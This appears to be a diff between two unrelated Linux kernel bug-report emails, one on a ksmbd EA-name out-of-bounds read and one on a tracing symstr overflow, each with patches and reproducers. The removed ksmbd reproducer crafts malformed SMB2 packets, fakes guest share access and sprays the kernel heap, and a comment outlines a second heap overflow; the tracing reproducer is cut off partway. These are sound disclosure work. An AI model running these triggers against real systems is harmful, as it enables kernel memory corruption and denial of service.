@@ -1,52 +1,51 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=45.254.49.197
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=101.71.155.101
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793620745;
-	b=LMvT0xtkb0/zTjYnRR7emTKc6HNeBDU+eZPCka9PjloiOuWsJQoaxX/hq7l5q2YRRJ8d
-	 UXMCu0B7I5/WBk3T+pTgIFX2OgRLy5IDjMnGtG8Twx+KyFBwxZzj2PRlq8zhN1l9wEcvp
-	 mKeLYwgNLFVlFBsuJtXxiOjDYd++TAA+qCUB23pFFAUJuJzTPWwkefCkb1lXPeKRZSzfi
-	 uP5+ww5w0upQX7hfdIdMZl6QaRvY2Il6eS7C6OcT9+hxeYIK3n2pkHQDGlUZSDNj1wX6e
-	 QRuq9r8yR+26fOJ41+shhIiUE9h7j/UizIagppwuyZx5ymuXN5Uq5iudRhQ/ymJNYPA==
+	t=1793620746;
+	b=vzvvj+48aeqb3NBxdTeIIawtsjnSsh8ttg5hG9TrmsnIpHkiZzhYz/EpirMxsapnlE+f
+	 8+xobyOgDl5M4g8KKjM3aiybTqzz8c7PzHBNbAnHX1p6mwA9NdEPn6LJvxIL59NTUfgYW
+	 KnTxE5o0rLRfM+NnjzjrdB9mLtw09IAPkALwz4quf6HhlyBPWqCksU+nMgYbBNRbaeyuP
+	 UHz5cTO0MFjlobEUztq3i2fukNw9Cm3+KL8quCJWVihDm/RaN2L5t/MabYyZgO9FNKqM3
+	 8jw0U3Fmr9L3krizhOT5PGVJpLoNQOlqYdk3GsvzUAFN1jOu+57d4DsiBCDj/AbZ2OA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793620745;
+	a=rsa-sha256; c=relaxed/relaxed; t=1793620746;
 	h=DMARC-Filter:Received:From:To:Cc:Date:Message-ID:Subject:In-Reply-To:
 	 References:MIME-Version:Content-Type:X-HM-Tid:X-HM-MType:
 	 X-HM-Spam-Status:DKIM-Signature;
-	bh=oa8Ddx4QS8s4S9BtkOk9MfE+bEqkDfFEluBCFq91bTU=;
-	b=aT2TDM+/GEBDdjnIv00CI3p5W9e3SJHsAGrgckGeyQgqziXMfmJxD+uuBgNA0NG9q/2v
-	 3In07s6ZSyvcyi5xCMS+4IQp28urCc44tkNd4ZG2Uk+N1mwVx5NwIll/bZKvBDAWOOOPM
-	 NTv0znV9KoT21dP1//2N1Kfd4mPtNHeiJqRIEwB9CvVLVwigVclqC9WL6LQs13g7DFvVb
-	 o6DvSdm0s1BuQ1PbW8kDCfobz11baX5Xfa6V2s4Px4IF0tMBVwXuwaPDBaep5fmyjNK3o
-	 jl7dVLmM8/RUKh1KYSQswrBxp2PP9b9el1mlvNPq1AGnKsKU4FyJkQdStzi7K/m0Mlg==
+	bh=3Fj9mudZJ+QQBZ3upIVz82snt/6C71t8Fk92mNqF0ZE=;
+	b=XoXgeSNTPhYc72Yvgv2NYNzmVublyvLNds7/yR7CC5p1iKpUX+RjseP19MLNJfb0c9Rp
+	 dcOn4BChwEK787kmUbyDo14xxXTrO7Su36cak7byKjuYOFvp50+iwGsKgY21ovg8nfAo4
+	 +hCRGjjedGE7iZ75aDuxsANOIhp8HhZZawRlWJ05roZPdiZlF8b1wxoV8mGNSE34wJuAH
+	 2/1ejOAsdukjzoFuLq7TOzK+afWUH5QuomNnKD/EmQO9SHux7cZs2bxzrXEiMqgHZXr9y
+	 Q1tX8/Ay82YH/JJOQ0iNgW83cDLfVi8mL/gzzfbGLUImjp8NMV5a3MYpEx7R2w3ippw==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=stu.pku.edu.cn;
 	spf=pass smtp.mailfrom=stu.pku.edu.cn;
-	dkim=pass header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=bnojChC6;
-	arc=none smtp.remote-ip=45.254.49.197
-Received: from mail-m49197.qiye.163.com (mail-m49197.qiye.163.com [45.254.49.197])
+	dkim=pass header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=NKBrmefD;
+	arc=none smtp.remote-ip=101.71.155.101
+Received: from mail-m155101.qiye.163.com (mail-m155101.qiye.163.com [101.71.155.101])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CD78C606A962;
-	Mon,  2 Nov 2026 11:59:01 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org CD78C606A962
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1227A606A971;
+	Mon,  2 Nov 2026 11:59:02 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 1227A606A971
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=stu.pku.edu.cn
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=stu.pku.edu.cn
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=bnojChC6
+	dkim=pass (1024-bit key, unprotected) header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=NKBrmefD
 Received: from 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa (unknown [1.202.162.49])
-	by smtp.qiye.163.com (Hmail) with ESMTP id 5330b235d;
-	Mon, 2 Nov 2026 19:58:58 +0800 (GMT+08:00)
+	by smtp.qiye.163.com (Hmail) with ESMTP id 5330b235e;
+	Mon, 2 Nov 2026 19:58:59 +0800 (GMT+08:00)
 From: Yifan Zhang <yfzhang23@stu.pku.edu.cn>
-To: Namjae Jeon <linkinjeon@kernel.org>,
- Sergey Senozhatsky <senozhatsky@chromium.org>, linux-cifs@vger.kernel.org
-Cc: Tom Talpey <tom@talpey.com>, ChenXiaoSong <chenxiaosong@chenxiaosong.com>,
- Steve French <stfrench@microsoft.com>, Ronnie Sahlberg <lsahlber@redhat.com>,
- Hyunchul Lee <hyc.lee@gmail.com>, linux-kernel@vger.kernel.org
+To: Steven Rostedt <rostedt@goodmis.org>,
+ Masami Hiramatsu <mhiramat@kernel.org>, linux-trace-kernel@vger.kernel.org
+Cc: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
+ linux-kernel@vger.kernel.org
 Date: Mon, 02 Nov 2026 19:58:37 +0800
-Message-ID: <179362071775.29269.3737313972716373343@stu.pku.edu.cn>
-Subject: Re: [PATCH] ksmbd: require NUL-terminated EA names
-In-Reply-To: <179362071772.29269.615878810410303214@stu.pku.edu.cn>
-References: <179362071772.29269.615878810410303214@stu.pku.edu.cn>
+Message-ID: <179362071776.29269.636621169914924951@stu.pku.edu.cn>
+Subject: Re: [PATCH] tracing/probes: bound symstr stores to reserved length
+In-Reply-To: <179362071772.29269.13958672165986396737@stu.pku.edu.cn>
+References: <179362071772.29269.13958672165986396737@stu.pku.edu.cn>
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -56,52 +55,55 @@ List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============3053206820710942250=="
-X-HM-Tid: 0aa19c20803503a2kunmab045f0fe850d
+Content-Type: multipart/mixed; boundary="===============5575217477510584208=="
+X-HM-Tid: 0aa19c20856e03a2kunmab045f0fe850f
 X-HM-MType: 10
 X-HM-Spam-Status: e1kfGhgUHx5ZQUpXWQgPGg8OCBgUHx5ZQUlOS1dZFg8aDwILHllBWSg2Ly
-	tZV1koWUFITzdXWRgWCB1ZQUpXWS1ZQUlXWQ8JGhUIEh9ZQVlCT0IaVkMZHUtMHksZH0IaHlYeHw
-	5VEwETFhoSFyQUDg9ZV1kYEgtZQVlKVUlLSVVKTUlVT0JZV1kWGg8SFR0UWUFZT0tIVUpLSEpMTU
-	NVSktLVUpCS0tZBg++
+	tZV1koWUFITzdXWRgWCB1ZQUpXWS1ZQUlXWQ8JGhUIEh9ZQVkaHUkdVk0eTkwdGExOTxhMQlYeHw
+	5VEwETFhoSFyQUDg9ZV1kYEgtZQVlKVUlLSVVKTUlVT0JZV1kWGg8SFR0UWUFZT0tIVUpLSUJDQ0
+	xVSktLVUtZBg++
 DKIM-Signature: a=rsa-sha256;
-	b=bnojChC66Y7/AtqNw4ipoLJ4pxeh2NPaJiVqAx8GsUnH+CAwMcUOnEGrSJDUFdn4gJUC6nY+PEOV6/5Xs3/y9tS5L1W7yPSslTDjIpB6B1F+11Vq8XMbM+IDV+BtLYCqmIlJaBM41TJ4IGtf0q9DTfMZYIj5jPb0Wr6BY7EvVmY=; s=default; c=relaxed/relaxed; d=stu.pku.edu.cn; v=1;
-	bh=oa8Ddx4QS8s4S9BtkOk9MfE+bEqkDfFEluBCFq91bTU=;
+	b=NKBrmefDoKj6MwQAmTUAQwdr8zfituPSMoTOm879b/43kjahzYtuUPJdYi2fD8wwEy1ompzKJeR1zXO8vUGKtSVQCeWMR5SiP87GV2qOEVKiBdyREqCf6xo8YNPvKnF/sXfRPX5nDPEJmkVKhboekLBsq9665lflGhzrHTsEUG8=; s=default; c=relaxed/relaxed; d=stu.pku.edu.cn; v=1;
+	bh=3Fj9mudZJ+QQBZ3upIVz82snt/6C71t8Fk92mNqF0ZE=;
 	h=date:mime-version:subject:message-id:from;
 
---===============3053206820710942250==
+--===============5575217477510584208==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
 
 Hello,
 
-I found an out-of-bounds read in smb2_set_ea() when an EA name is not
-NUL-terminated. I reproduced it on two independent boots of an unmodified
-Linux v7.3 KASAN kernel. Both runs reported:
+I found an out-of-bounds write in traceprobe symstr storage when the probed
+pointer changes between the size and store passes. I reproduced it on two
+independent boots of an unmodified Linux v7.3 KASAN kernel. The first run
+reported:
 
-  BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
-  Read of size 1
-  string
-  vsnprintf
-  _printk
-  smb2_set_ea
-  smb2_set_info
+  BUG: KASAN: slab-out-of-bounds in sized_strscpy+0x248/0x2f0
+  Write of size 8
+  sized_strscpy
+  module_address_lookup
+  kallsyms_lookup_buildid
+  __sprint_symbol
+  process_fetch_insn
 
-smb2_set_ea() checks that the byte reserved for the EA-name terminator lies
-inside the request, but does not check that the byte is zero. With SMB debug
-logging enabled, the name is passed to %s and the diagnostic continues
-reading beyond the request allocation.
+fetch_store_symstrlen() reserves space using the first symbol value. The
+store pass can then observe a longer symbol. fetch_store_symstring() reads the
+reserved maxlen but ignores it and calls unbounded sprint_symbol(), allowing
+the longer result to overwrite the trace record.
 
-The attached reproducer starts the minimal ksmbd userspace control plane and
-sends the SET_INFO request over loopback:
+The attached helper provides the changing pointer and the userspace program
+installs a 64-field symstr kprobe event:
 
-  cc -O2 -static -pthread repro.c -o repro
-  ./repro
+  make -C /lib/modules/$(uname -r)/build M=$PWD modules
+  cc -O2 repro.c -o repro
+  sudo insmod helper.ko
+  sudo ./repro 300
 
 Both runs used copies of the default syzkaller ext4 image.
 
-The attached patch rejects an EA entry whose declared terminator byte is
-nonzero. The patched kernel returns STATUS_INVALID_PARAMETER without a KASAN
-report.
+The attached patch formats the symbol using the reserved length as the
+destination bound. The patched kernel completed the same workload without a
+KASAN report.
 
 The patch is in the parent message. The reproducer source(s), KASAN
 report(s), and kernel config are attached.
@@ -109,1482 +111,850 @@ report(s), and kernel config are attached.
 Regards,
 Yifan Zhang
 
---===============3053206820710942250==
+--===============5575217477510584208==
 Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="repro.c"
 MIME-Version: 1.0
 
-#define main ksmbd_base_main
-#include "ksmbd-base.c"
-#undef main
-
-#include <linux/vhost.h>
-
-#define SMB2_SET_INFO 17
-
-static void *writable_ipc_thread(void *arg)
-{
-	int family = (int)(long)arg;
-	char buf[8192];
-	struct timeval tv = { .tv_sec = 1 };
-
-	setsockopt(nl_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-	ipc_running = 1;
-	while (ipc_running) {
-		ssize_t n = recv(nl_fd, buf, sizeof(buf), 0);
-		struct nlmsghdr *nlh;
-		struct genlmsghdr *gnl;
-		struct nlattr *a;
-		void *payload = NULL;
-		int rem, plen = 0, cmd;
-
-		if (n < (ssize_t)sizeof(struct nlmsghdr))
-			continue;
-		nlh = (struct nlmsghdr *)buf;
-		if (nlh->nlmsg_type != family)
-			continue;
-		gnl = (struct genlmsghdr *)NLMSG_DATA(nlh);
-		cmd = gnl->cmd;
-		a = (struct nlattr *)((char *)gnl + sizeof(*gnl));
-		rem = nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*gnl));
-		while (NLA_OK(a, rem)) {
-			payload = (char *)a + NLA_HDRLEN;
-			plen = a->nla_len - NLA_HDRLEN;
-			a = NLA_NEXT(a, rem);
-		}
-		if (!payload)
-			continue;
-
-		if (cmd == KSMBD_EVENT_LOGIN_REQUEST &&
-		    plen >= (int)sizeof(struct ksmbd_login_request)) {
-			struct ksmbd_login_request *lr = payload;
-			struct ksmbd_login_response resp = {};
-
-			resp.handle = lr->handle;
-			resp.gid = 0;
-			resp.uid = 0;
-			memcpy(resp.account, lr->account, sizeof(resp.account));
-			resp.status = KSMBD_USER_FLAG_OK |
-				      KSMBD_USER_FLAG_GUEST_ACCOUNT;
-			resp.hash_sz = 16;
-			memset(resp.hash, 0x11, 16);
-			nl_send_resp(family, KSMBD_EVENT_LOGIN_RESPONSE,
-				     &resp, sizeof(resp));
-		} else if (cmd == KSMBD_EVENT_SHARE_CONFIG_REQUEST &&
-			   plen >= (int)sizeof(struct ksmbd_share_config_request)) {
-			struct ksmbd_share_config_request *sr = payload;
-			char sresp[2048] = {};
-			struct ksmbd_share_config_response *resp = (void *)sresp;
-			const char path[] = "/tmp";
-
-			resp->handle = sr->handle;
-			resp->flags = KSMBD_SHARE_FLAG_AVAILABLE |
-				      KSMBD_SHARE_FLAG_WRITEABLE |
-				      KSMBD_SHARE_FLAG_GUEST_OK;
-			resp->create_mask = 0666;
-			resp->directory_mask = 0777;
-			strcpy((char *)resp->share_name, "TEST");
-			resp->payload_sz = sizeof(path);
-			memcpy(sresp + sizeof(*resp), path, sizeof(path));
-			nl_send_resp(family, KSMBD_EVENT_SHARE_CONFIG_RESPONSE,
-				     sresp, sizeof(*resp) + sizeof(path));
-		} else if (cmd == KSMBD_EVENT_TREE_CONNECT_REQUEST &&
-			   plen >= (int)sizeof(struct ksmbd_tree_connect_request)) {
-			struct ksmbd_tree_connect_request *tr = payload;
-			struct ksmbd_tree_connect_response resp = {};
-
-			resp.handle = tr->handle;
-			resp.status = 0;
-			resp.connection_flags = 0x1 | 0x4; /* guest | writable */
-			nl_send_resp(family, KSMBD_EVENT_TREE_CONNECT_RESPONSE,
-				     &resp, sizeof(resp));
-		}
-	}
-	return NULL;
-}
-
-static size_t build_create_ea_target(uint8_t *buf)
-{
-	static const uint16_t name[] = {
-		'e', 'a', '_', 't', 'a', 'r', 'g', 'e', 't'
-	};
-	uint8_t *hdr, *p;
-
-	memset(buf, 0, 512);
-	put_hdr(buf, SMB2_CREATE, cur_mid++, 0);
-	hdr = buf + 4;
-	p = hdr + 64;
-	*(uint16_t *)p = 57; p += 2;
-	*p++ = 0;
-	*p++ = 0;
-	*(uint32_t *)p = 0; p += 4;
-	memset(p, 0, 16); p += 16;
-	*(uint32_t *)p = 0x0012019f; p += 4;
-	*(uint32_t *)p = 0; p += 4;
-	*(uint32_t *)p = 7; p += 4;
-	*(uint32_t *)p = 3; p += 4; /* FILE_OPEN_IF */
-	*(uint32_t *)p = 0; p += 4;
-	*(uint16_t *)p = 120; p += 2;
-	*(uint16_t *)p = sizeof(name); p += 2;
-	*(uint32_t *)p = 0; p += 4;
-	*(uint32_t *)p = 0; p += 4;
-	memcpy(p, name, sizeof(name));
-	p += sizeof(name);
-	return (size_t)(p - buf) - 4;
-}
-
-static size_t build_set_ea_no_nul(uint8_t *buf, uint64_t persistent,
-				   uint64_t volatile_id)
-{
-	uint8_t *hdr, *p, *ea;
-	const unsigned int name_len = 111;
-	const unsigned int value_len = 8;
-	const unsigned int ea_len = 8 + name_len + 1 + value_len;
-
-	memset(buf, 0x41, 1024);
-	put_hdr(buf, SMB2_SET_INFO, cur_mid++, 0);
-	hdr = buf + 4;
-	p = hdr + 64;
-	*(uint16_t *)p = 33; p += 2;
-	*p++ = 1;  /* SMB2_O_INFO_FILE */
-	*p++ = 15; /* FILE_FULL_EA_INFORMATION */
-	*(uint32_t *)p = ea_len; p += 4;
-	*(uint16_t *)p = 96; p += 2;
-	*(uint16_t *)p = 0; p += 2;
-	*(uint32_t *)p = 0; p += 4;
-	*(uint64_t *)p = persistent; p += 8;
-	*(uint64_t *)p = volatile_id; p += 8;
-
-	ea = p;
-	*(uint32_t *)(ea + 0) = 0;
-	ea[4] = 0;
-	ea[5] = name_len;
-	*(uint16_t *)(ea + 6) = value_len;
-	memset(ea + 8, 'A', name_len);
-	ea[8 + name_len] = 'X'; /* required NUL slot: deliberately non-NUL */
-	memset(ea + 8 + name_len + 1, 'V', value_len);
-	p += ea_len;
-	return (size_t)(p - buf) - 4;
-}
-
-static int prime_kmalloc_256(void)
-{
-	struct {
-		uint32_t nregions;
-		uint32_t padding;
-		struct vhost_memory_region regions[7];
-	} mem;
-	char mapped[4096] __attribute__((aligned(4096)));
-	int fd, i, round;
-
-	fd = open("/dev/vhost-net", O_RDWR);
-	if (fd < 0) {
-		perror("open vhost-net");
-		return -1;
-	}
-	if (ioctl(fd, VHOST_SET_OWNER, 0) < 0)
-		perror("VHOST_SET_OWNER");
-	mem.nregions = 7;
-	mem.padding = 0;
-	for (i = 0; i < 7; i++) {
-		mem.regions[i].guest_phys_addr = 0x1000ULL * (i + 1);
-		mem.regions[i].memory_size = 0x1000;
-		mem.regions[i].userspace_addr = (uintptr_t)mapped;
-		mem.regions[i].flags_padding = 0x5a5a5a5a5a5a5a5aULL;
-	}
-	for (round = 0; round < 200000; round++)
-		(void)ioctl(fd, VHOST_SET_MEM_TABLE, &mem);
-	fprintf(stderr, "primed kmalloc-256 with 200000 vhost memory tables\n");
-	return fd;
-}
-
-static void enable_ksmbd_smb_debug(void)
-{
-	int fd = open("/sys/class/ksmbd-control/debug", O_WRONLY);
-
-	if (fd < 0) {
-		perror("open ksmbd debug");
-		return;
-	}
-	if (write(fd, "smb\n", 4) != 4)
-		perror("write ksmbd debug");
-	close(fd);
-}
-
-int main(void)
-{
-	uint8_t buf[4096], rbuf[8192];
-	uint64_t persistent, volatile_id;
-	ssize_t rn;
-	size_t n;
-	int fam, fd;
-	pthread_t tid;
-
-	nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-	if (nl_fd < 0)
-		return 1;
-	fam = genl_family_id();
-	if (fam < 0 || start_ksmbd(fam) < 0)
-		return 2;
-	pthread_create(&tid, NULL, writable_ipc_thread, (void *)(long)fam);
-	usleep(200000);
-
-	{
-		int s = socket(AF_INET, SOCK_DGRAM, 0);
-		struct ifreq ifr = {};
-		strcpy(ifr.ifr_name, "lo");
-		ioctl(s, SIOCGIFFLAGS, &ifr);
-		ifr.ifr_flags |= IFF_UP;
-		ioctl(s, SIOCSIFFLAGS, &ifr);
-		close(s);
-	}
-	usleep(300000);
-	enable_ksmbd_smb_debug();
-	sleep(2);
-
-	fd = reconnect_guest();
-	if (fd < 0)
-		return 3;
-
-	n = build_create_ea_target(buf);
-	smb_send(fd, buf, n);
-	rn = smb_recv(fd, rbuf, sizeof(rbuf));
-	if (rn < 4 + 144 || *(uint32_t *)(rbuf + 12)) {
-		fprintf(stderr, "CREATE failed: rn=%zd status=%08x\n", rn,
-			rn >= 16 ? *(uint32_t *)(rbuf + 12) : 0xffffffffu);
-		return 4;
-	}
-	persistent = *(uint64_t *)(rbuf + 4 + 128);
-	volatile_id = *(uint64_t *)(rbuf + 4 + 136);
-	fprintf(stderr, "CREATE fid=(%llu,%llu)\n",
-		(unsigned long long)persistent,
-		(unsigned long long)volatile_id);
-
-	{
-		int vhost_fd = prime_kmalloc_256();
-		(void)vhost_fd; /* Keep the vhost object alive through the trigger. */
-	}
-	n = build_set_ea_no_nul(buf, persistent, volatile_id);
-	fprintf(stderr, "SET_INFO pdu=%zu: non-NUL EA name at packet tail\n", n);
-	smb_send(fd, buf, n);
-	rn = smb_recv(fd, rbuf, sizeof(rbuf));
-	fprintf(stderr, "SET_INFO reply=%zd status=%08x\n", rn,
-		rn >= 16 ? *(uint32_t *)(rbuf + 12) : 0xffffffffu);
-	sleep(2);
-	return 0;
-}
-
---===============3053206820710942250==
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: quoted-printable
-Content-Disposition: attachment; filename="ksmbd-base.c"
-MIME-Version: 1.0
-
-/*
- * ksmbd AAPL multi-context heap OOB write
- *
- * smb2_allocate_rsp_buf() sizes CREATE responses at MAX_CIFS_SMALL_BUFFER_SI=
-ZE
- * (448) including the 4-byte RFC1002 header.  The create_rsp body starts at
- * offset 4, and rsp->Buffer (first create context) is at +152 of the PDU.
- * Usable context space =3D 448 - 4 - 152 =3D 292 bytes.
- *
- * smb2_open() appends one response context per requested create context with
- * no remaining-space check:
- *   lease_v2 (84) + mxac (36) + QFid (60) + AAPL (128) =3D 308 > 292
- *
- * Additionally create_aapl_rsp_buf() writes a 31-char UTF-16 model string
- * starting at offset 68 of the AAPL slot, ending at 130, while the slot is
- * accounted as AAPL_RSP_MAX_SIZE=3D128.
- *
- * Trigger: guest session + TIME_MACHINE share + CREATE requesting
- * RqLs + MxAc + QFid + AAPL(MODEL_INFO), with aapl_model =3D 31 chars.
- */
+// SPDX-License-Identifier: GPL-2.0
 #define _GNU_SOURCE
-#include <sched.h>
+
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/perf_event.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <stdint.h>
-#include <fcntl.h>
-#include <pthread.h>
-#include <sys/socket.h>
 #include <sys/ioctl.h>
+#include <sys/mount.h>
 #include <sys/stat.h>
-#include <net/if.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <linux/netlink.h>
-#include <linux/genetlink.h>
+#include <sys/syscall.h>
+#include <unistd.h>
 
-#ifndef NLA_OK
-#define NLA_OK(nla, rem) ((rem) >=3D (int)sizeof(struct nlattr) && \
-	(nla)->nla_len >=3D sizeof(struct nlattr) && (nla)->nla_len <=3D (rem))
-#define NLA_NEXT(nla, rem) ((rem) -=3D NLA_ALIGN((nla)->nla_len), \
-	(struct nlattr *)((char *)(nla) + NLA_ALIGN((nla)->nla_len)))
-#endif
+#define TRACEFS "/sys/kernel/tracing"
+#define NR_FIELDS 64
 
-#define KSMBD_GENL_NAME		"SMBD_GENL"
-#define KSMBD_GENL_VERSION	0x01
-#define KSMBD_EVENT_STARTING_UP		2
-#define KSMBD_EVENT_LOGIN_REQUEST	4
-#define KSMBD_EVENT_LOGIN_RESPONSE	5
-#define KSMBD_EVENT_SHARE_CONFIG_REQUEST 6
-#define KSMBD_EVENT_SHARE_CONFIG_RESPONSE 7
-#define KSMBD_EVENT_TREE_CONNECT_REQUEST  8
-#define KSMBD_EVENT_TREE_CONNECT_RESPONSE 9
+static void die(const char *what)
+{
+	perror(what);
+	exit(1);
+}
 
-#define KSMBD_REQ_MAX_ACCOUNT_NAME_SZ	48
-#define KSMBD_REQ_MAX_HASH_SZ		18
-#define KSMBD_REQ_MAX_SHARE_NAME	64
+static void write_text(const char *path, const char *text)
+{
+	int fd =3D open(path, O_WRONLY | O_CLOEXEC);
+	ssize_t len =3D strlen(text);
 
-#define KSMBD_USER_FLAG_OK		(1u << 0)
-#define KSMBD_USER_FLAG_GUEST_ACCOUNT	(1u << 4)
-#define KSMBD_SHARE_FLAG_AVAILABLE	(1u << 0)
-#define KSMBD_SHARE_FLAG_WRITEABLE	(1u << 2)
-#define KSMBD_SHARE_FLAG_GUEST_OK	(1u << 4)
-#define KSMBD_SHARE_FLAG_OPLOCKS	(1u << 7)
-#define KSMBD_SHARE_FLAG_TIME_MACHINE	(1u << 18)
-
-struct ksmbd_startup_request {
-	uint32_t flags; int32_t signing;
-	int8_t min_prot[16], max_prot[16], netbios_name[16];
-	int8_t work_group[64], server_string[64];
-	uint16_t tcp_port, ipc_timeout;
-	uint32_t deadtime, file_max, smb2_max_write, smb2_max_read;
-	uint32_t smb2_max_trans, share_fake_fscaps, sub_auth[3];
-	uint32_t smb2_max_credits, smbd_max_io_size, max_connections;
-	int8_t bind_interfaces_only;
-	uint32_t max_ip_connections;
-	int8_t aapl_model[32], reserved[467];
-	uint32_t ifc_list_sz;
-} __attribute__((packed));
-
-/* ---- IPC structs: must match fs/smb/server/ksmbd_netlink.h layout AND
- * sizeof.  The kernel structs are NOT __packed; the nla_policy .len check
- * uses sizeof(struct ksmbd_login_response) =3D=3D 148 (2 bytes tail pad befo=
-re
- * reserved[]).  Do not mark these __packed. ---- */
-struct ksmbd_login_request {
-	uint32_t handle;
-	int8_t account[KSMBD_REQ_MAX_ACCOUNT_NAME_SZ];
-	uint32_t reserved[16];
-};
-
-struct ksmbd_login_response {
-	uint32_t handle;
-	uint32_t gid;
-	uint32_t uid;
-	int8_t  account[KSMBD_REQ_MAX_ACCOUNT_NAME_SZ];
-	uint16_t status;
-	uint16_t hash_sz;
-	int8_t  hash[KSMBD_REQ_MAX_HASH_SZ];
-	uint32_t reserved[16];
-};
-
-struct ksmbd_share_config_request {
-	uint32_t handle;
-	int8_t share_name[KSMBD_REQ_MAX_SHARE_NAME];
-	uint32_t reserved[16];
-};
-
-struct ksmbd_share_config_response {
-	uint32_t handle;
-	uint32_t flags;
-	uint16_t create_mask;
-	uint16_t directory_mask;
-	uint16_t force_create_mode;
-	uint16_t force_directory_mode;
-	uint16_t force_uid;
-	uint16_t force_gid;
-	int8_t  share_name[KSMBD_REQ_MAX_SHARE_NAME];
-	uint32_t reserved[111];
-	uint32_t payload_sz;
-	uint32_t veto_list_sz;
-};
-
-struct ksmbd_tree_connect_request {
-	uint32_t handle;
-	uint16_t account_flags;
-	uint16_t flags;
-	uint64_t session_id;
-	uint64_t connect_id;
-	int8_t account[KSMBD_REQ_MAX_ACCOUNT_NAME_SZ];
-	int8_t share[KSMBD_REQ_MAX_SHARE_NAME];
-	int8_t peer_addr[64];
-	uint32_t reserved[16];
-};
-
-struct ksmbd_tree_connect_response {
-	uint32_t handle;
-	uint16_t status;
-	uint16_t connection_flags;
-	uint32_t reserved[16];
-};
-
-#define SMB2_PROTO	0x424D53FEu
-#define SMB2_NEGOTIATE	0
-#define SMB2_SESSION_SETUP	1
-#define SMB2_TREE_CONNECT	3
-#define SMB2_CREATE		5
-#define SMB2_CLOSE		6
-
-struct smb2_hdr {
-	uint32_t ProtocolId;
-	uint16_t StructureSize;
-	uint16_t CreditCharge;
-	uint32_t Status;
-	uint16_t Command;
-	uint16_t CreditRequest;
-	uint32_t Flags;
-	uint32_t NextCommand;
-	uint64_t MessageId;
-	uint32_t ProcessId;
-	uint32_t TreeId;
-	uint64_t SessionId;
-	uint8_t  Signature[16];
-} __attribute__((packed));
-
-static int nl_fd =3D -1;
-static volatile int ipc_running =3D 0;
-static uint64_t cur_mid =3D 0;
-static uint64_t session_id =3D 0;
-static uint32_t tree_id =3D 0;
-
-static int genl_family_id(void) {
-	int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-	if (fd < 0) return -1;
-	struct { struct nlmsghdr nlh; struct genlmsghdr gnl; char attrs[128]; } req;
-	memset(&req, 0, sizeof req);
-	req.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr));
-	req.nlh.nlmsg_type =3D GENL_ID_CTRL;
-	req.nlh.nlmsg_flags =3D NLM_F_REQUEST;
-	req.gnl.cmd =3D CTRL_CMD_GETFAMILY;
-	req.gnl.version =3D 1;
-	struct nlattr *na =3D (struct nlattr *)req.attrs;
-	na->nla_type =3D CTRL_ATTR_FAMILY_NAME;
-	na->nla_len =3D NLA_HDRLEN + strlen(KSMBD_GENL_NAME) + 1;
-	memcpy((char *)na + NLA_HDRLEN, KSMBD_GENL_NAME, strlen(KSMBD_GENL_NAME) + 1=
-);
-	req.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr)) + NLA_ALIGN(na=
-->nla_len);
-	if (send(fd, &req, req.nlh.nlmsg_len, 0) < 0) { close(fd); return -1; }
-	char buf[4096];
-	if (recv(fd, buf, sizeof buf, 0) < 0) { close(fd); return -1; }
+	if (fd < 0)
+		die(path);
+	if (write(fd, text, len) !=3D len)
+		die("write tracefs control");
 	close(fd);
-	struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
-	if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) return -1;
